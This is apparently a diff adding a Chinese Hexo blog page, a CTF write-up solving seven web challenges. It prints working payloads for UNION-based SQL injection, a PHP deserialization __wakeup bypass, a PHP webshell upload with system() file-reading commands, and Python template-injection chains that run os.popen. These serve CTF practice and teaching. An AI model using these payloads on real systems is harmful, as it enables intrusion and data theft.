@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=0">
+
+  <meta name="description" content="0x01 Training-WWW-Robots据题目描述可知，考查Robots协议。
+解题：英文小短文 Robots &amp;gt;&amp;gt;&amp;gt; ./robots.txt &amp;gt;&amp;gt;&amp;gt; ./fl0g.php
+0x02  baby_web据题目描述可知，考查HTTP请求头、重定向。
+
+1x">
+
+
+<link rel="alternate" href="/atom.xml" title="Gu Chuan&#39;s blog" type="application/atom+xml">
+<meta name="theme-color" content="#a1d0f6">
+<title>攻防WEB-Two - Gu Chuan&#39;s blog</title>
+<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+<link rel="shortcut icon" href="/favicon.png">
+<link rel="stylesheet" href="/css/style.css">
+<nav class="main-nav">
+	
+	    <a href="/">← Home</a>
+	
+	
+	    <a href="/about/">About</a>
+	
+	    <a href="/archives/">Archives</a>
+	
+	    <a href="/links/">Links</a>
+	
+	<a class="cta" href="/atom.xml" data-no-instant>Subscribe</a>
+</nav>
+
+<section id="wrapper">
+    <article class="post">
+    <header>
+        
+            <h1>攻防WEB-Two</h1>
+        
+        <h2 class="headline">Feb 04 2020
+        
+        </h2>
+    </header>
+</article>
+<section id="post-body"><h1 id="0x01-Training-WWW-Robots"><a href="#0x01-Training-WWW-Robots" class="headerlink" title="0x01 Training-WWW-Robots"></a>0x01 Training-WWW-Robots</h1><p>据题目描述可知，考查Robots协议。</p>
+<p>解题：英文小短文 Robots &gt;&gt;&gt; ./robots.txt &gt;&gt;&gt; ./fl0g.php</p>
+<h1 id="0x02-baby-web"><a href="#0x02-baby-web" class="headerlink" title="0x02  baby_web"></a>0x02  baby_web</h1><p>据题目描述可知，考查<a href="https://baike.baidu.com/item/http%E8%AF%B7%E6%B1%82%E5%A4%B4/6623287?fr=aladdin" target="_blank" rel="noopener">HTTP请求头</a>、重定向。</p>
+<blockquote>
+<p>1xx： 信息，服务器收到请求，需要请求者继续执行操作。</p>
+<p>2xx： 成功，操作被成功接收并处理。</p>
+<p>3xx： 重定向，需要进一步的操作以完成请求。</p>
+<p>4xx：客户端错误，请求包含语法错误或者请求无法实现。</p>
+<p>5xx： 服务器错误，服务器在处理请求的过程中发生了错误。</p>
+<p> Location：表示客户应当到哪里去提取文档。Location通常不是直接设置的，而是通过HttpServletResponse的sendRedirect方法，该方法同时设置<a href="https://baike.baidu.com/item/状态代码" target="_blank" rel="noopener">状态代码</a>为302。 </p>
+</blockquote>
+<p>解题： “想想初始页面是哪个?” &gt;&gt;&gt;访问 ./index.php重定向 ./1.php &gt;&gt;&gt;抓包查看</p>
+<h1 id="0x03-NewsCenter"><a href="#0x03-NewsCenter" class="headerlink" title="0x03  NewsCenter"></a>0x03  NewsCenter</h1><p>直觉 SQL注入。</p>
+<p>解题：</p>
+<p>1’   判断注入点</p>
+<p>1’ order by 4#   判断字段数</p>
+<p>1’ union select 1,2,3#   查看回显位</p>
+<p>1’ union select 1,database(),3#   查看数据库名</p>
+<p> 1’ union select 1,group_concat(table_name),3  from  information_schema.tables where table_schema =’news’ #    查看数据表名</p>
+<p> 1’ union select 1, group_concat(column_name),3  from  information_schema.columns where table_name =’secret_table’ #    查看字段名</p>
+<p> 1’ union select 1,fl4g,3  from  secret_table#  查看数据</p>
+<h1 id="0x04-NaNNaNNaNNaN-Batman"><a href="#0x04-NaNNaNNaNNaN-Batman" class="headerlink" title="0x04  NaNNaNNaNNaN-Batman"></a>0x04  NaNNaNNaNNaN-Batman</h1><p>据附件源码可知，考查 JavaScript 知识。</p>
+<p><img src="/2020/02/04/%E6%94%BB%E9%98%B2WEB-Two/D:%5CBlog%5CHexo%5CGG%5Csource%5C_posts%5C%E6%94%BB%E9%98%B2WEB-Two%5CNaN.png" alt></p>
+<p>分析： e 字符串需要符合长度为16并且以be0f23开头以e98aa结尾并且需要匹配233ac和c7be9。</p>
+<p>解题： 一、eval()改为alert() 弹出源码&gt;&gt;&gt;控制台运行源码&gt;&gt;&gt;输入 be0f23ac7be98aa</p>
+<p>​             二、 eval()改为console.log() 显示源码&gt;&gt;&gt;控制台直接运行关键中心代码</p>
+<blockquote>
+<p>console.log() 在控制台输出信息。 </p>
+<p>eval() 将传入的字符串当做 JavaScript 代码进行执行。 </p>
+<p>alert() 显示带有一条指定消息和一个 确认 按钮的警告框。 </p>
+</blockquote>
+<h1 id="0x05-unserialize3"><a href="#0x05-unserialize3" class="headerlink" title="0x05  unserialize3"></a>0x05  unserialize3</h1><p>据题名可知，考查PHP反序列化。</p>
+<blockquote>
+<p>PHP反序列化 magic函数__ wakeup()，__ wakeup()函数漏洞与对象的属性个数有关。如果序列化后的字符串中表示属性个数的数字与真实属性个数一致，对象自动就调用__ wakeup()函数；如果表示属性个数的数字大于真实属性个数，对象就会绕过__wakeup()函数。</p>
+</blockquote>
+<p>解题：据源码构造序列化字符串&gt;&gt;&gt;?code=O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}  </p>
+<h1 id="0x06-upload1"><a href="#0x06-upload1" class="headerlink" title="0x06  upload1"></a>0x06  upload1</h1><p>据题名可知，考查文件上传。</p>
+<p>解题：一、惯性上传PHP一句话木马&gt;&gt;&gt;得知文件应为图片&gt;&gt;&gt;一句话改后缀再次上传&gt;&gt;&gt;再将文件信息改为filename=”muma.php”&gt;&gt;&gt;再次上传&gt;&gt;&gt;成功得到返回路径并使用菜刀连接</p>
+<p>​            二、上传包含执行命令的脚本&gt;&gt;&gt;通过访问返回的路径得到flag  </p>
+<p>命令依次：phpinfo()；system(‘ls ../‘); system(‘cat ../flag.php’);</p>
+<blockquote>
+<p>system() 执行 DOS 或 SHELL 命令。</p>
+</blockquote>
+<h1 id="0x07-Web-python-template-injection"><a href="#0x07-Web-python-template-injection" class="headerlink" title="0x07  Web_python_template_injection"></a>0x07  Web_python_template_injection</h1><p>据题名可知，考查python 模板注入。</p>
+<blockquote>
+<p>__ class__  返回一个类型所属的对象。</p>
+<p>__ mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。( 寻找基类 )</p>
+<p>__ base__   返回一个对象所继承的基类。( 寻找基类 )</p>
+<p>__ subclasses__ ()  每个新类都保留了子类的引用，这个方法返回一个类中仍然可引用的的子类列表。</p>
+<p>__ init__  类的初始化方法。</p>
+<p>function.__ globals__  对包含函数全局变量的字典的引用。</p>
+<p> 在python中，object类是Python中所有类的基类，如果定义一个类时没有指定继承哪个类，则默认继承object类。 </p>
+</blockquote>
+<p>解题：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/&#123;&#123;7+7&#125;&#125;    </span><br><span class="line">返回14，存在模块注入</span><br><span class="line">/&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;   </span><br><span class="line">寻找基类，查看所有模块，寻找os、file模块</span><br><span class="line">/&#123;&#123;[].__class__.__base__.__subclasses__()[40]&#125;&#125; </span><br><span class="line">file模块</span><br><span class="line">/&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()&#125;&#125;</span><br><span class="line">查看catch_warnings模块的全局函数</span><br><span class="line">/&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]  </span><br><span class="line">找到linecache函数(包含os模块)</span><br><span class="line">/&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&apos; )&#125;&#125;</span><br><span class="line">找关键目录</span><br><span class="line">/&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;cat fl4g&quot;).read()&apos; )&#125;&#125;</span><br><span class="line">或</span><br><span class="line">/&#123;&#123;[].__class__.__base__.__subclasses__()[40](&quot;fl4g&quot;).read()&#125;&#125;</span><br><span class="line">读取flag</span><br></pre></td></tr></table></figure>
+
+</section>
+    
+        
+        <h2 class="footline">
+            <a href="/tags/ctf/#ctf">ctf</a>
+        </h2>
+    
+
+    <footer id="post-meta" class="clearfix">
+        <a href="/about/">
+        <img class="avatar" src="/images/guchuan.JPG">
+        <div>
+            <span class="dark">Gu Chuan&#39;s blog</span>
+            <span>没学过从来不是理由</span>
+        </div>
+        </a>
+        <section id="sharing">
+            <a title="Share to Twitter" class="twitter" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2020/02/04/%E6%94%BB%E9%98%B2WEB-Two/ - 攻防WEB-Two @" target="_blank" rel="noopener"><span class="icon-twitter">tweet</span></a>
+            <a title="Share to Facebook" class="facebook" href="#" onclick="
+                window.open(
+                  'https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(location.href),
+                  'facebook-share-dialog',
+                  'width=626,height=436');
+                return false;"><span class="icon-facebook-sign">Share</span>
+            </a>
+        </section>
+    </footer>
+
+
+  <section id="comment">
+    <button class="btn" id="loadcmts" onclick="cmts.load();">Load Comments</button>
+    <div id="gitment"></div>
+    <script src='/js/gitment.browser.js'></script>
+    <link rel="stylesheet" href=''>
+    <script>
+      var cmts={
+        load:function cmts(){
+          var gitment = new Gitment({
+          
+            id: "攻防WEB-Two",
+          
+            owner: "",
+            repo: "",
+            oauth: {
+              client_id: "",
+              client_secret: "",
+            },
+          })
+          gitment.render('gitment');
+          var loadcmt = document.getElementById("loadcmts");
+          var imyourfather = loadcmt.parentNode;
+          imyourfather.removeChild(loadcmts)
+        }
+      }
+    </script>
+  </section>
+
+
+	<footer id="footer">
+	<div id="social">
+		<p class="small">©  Gu Chuan&#39;s blog| Powered by Hexo & 
+			<a href="https://github.com/F0r3at/Lights" target="_blank" rel="noopener"> Lights</a>
+		</p>
+	</div>
+</footer>
+
+</section>
+
+	<script src="//cdnjs.loli.net/ajax/libs/instantclick/3.0.1/instantclick.min.js" data-no-instant></script>
+	<script data-no-instant>
+		
+		InstantClick.init('mousedown');
+	</script>
+
+
+
